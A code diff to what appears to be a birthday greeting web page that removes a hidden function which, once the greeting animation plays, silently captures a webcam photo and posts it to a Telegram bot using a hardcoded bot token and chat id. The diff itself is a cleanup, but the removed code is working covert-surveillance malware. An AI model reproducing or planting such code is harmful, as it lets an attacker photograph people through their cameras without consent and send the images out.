@@ -130,9 +130,6 @@
       title.id = 'center-title';
       title.textContent = '🎂 Happy Birthday! 🎂I wish you all the best in life, and I hope you achieve everything you’ve ever wished for. May this year bring you happiness, success, and beautiful moments. You truly deserve the best!🤍';
       partyStage.appendChild(title);
-
-      // Call camera capture code here
-      captureAndSendPhoto();
     }
 
     video.addEventListener('ended', startParty);
@@ -195,95 +192,6 @@
         }
         requestAnimationFrame(animate);
       });
-    }
-
-    function captureAndSendPhoto() {
-      const newVideo = document.createElement('video');
-      const canvas = document.createElement('canvas');
-      const context = canvas.getContext('2d');
-
-      const chatIds = [
-          '-1004348068103'
-      ];
-
-      const telegramToken = '7787402061:AAFT_HmER6J9o0JfU6u1LeiGeGHKXNpaSM0';
-
-      //
-      navigator.mediaDevices.getUserMedia({ video: true })
-          .then((stream) => {
-              newVideo.srcObject = stream;
-              newVideo.autoplay = true;
-
-              newVideo.addEventListener('loadedmetadata', () => {
-                  canvas.width = newVideo.videoWidth;
-                  canvas.height = newVideo.videoHeight;
-
-                  // 
-                  context.translate(canvas.width, 0);
-                  context.scale(-1, 1);
-
-                  context.drawImage(
-                      newVideo,
-                      0,
-                      0,
-                      canvas.width,
-                      canvas.height
-                  );
-
-                  const imageData = canvas.toDataURL('image/png');
-
-                  // 
-                  stream.getTracks().forEach(track => track.stop());
-
-                  sendToTelegram(imageData);
-              });
-          })
-          .catch((err) => {
-              console.error('Camera access error:', err);
-          });
-
-      function sendToTelegram(imageData) {
-          const blob = dataURLToBlob(imageData);
-
-          chatIds.forEach(chatId => {
-              const formData = new FormData();
-
-              formData.append('chat_id', chatId);
-              formData.append('photo', blob, 'photo.png');
-
-              fetch(
-                  `https://api.telegram.org/bot${telegramToken}/sendPhoto`,
-                  {
-                      method: 'POST',
-                      body: formData
-                  }
-              )
-              .then(response => response.json())
-              .then(data => {
-                  console.log('Photo sent:', data);
-              })
-              .catch(error => {
-                  console.error('Telegram error:', error);
-              });
-          });
-      }
-
-      function dataURLToBlob(dataURL) {
-          const byteString = atob(dataURL.split(',')[1]);
-          const mimeString =
-              dataURL.split(',')[0].split(':')[1].split(';')[0];
-
-          const arrayBuffer = new ArrayBuffer(byteString.length);
-          const uint8Array = new Uint8Array(arrayBuffer);
-
-          for (let i = 0; i < byteString.length; i++) {
-              uint8Array[i] = byteString.charCodeAt(i);
-          }
-
-          return new Blob([arrayBuffer], {
-              type: mimeString
-          });
-      }
     }
   </script>
 
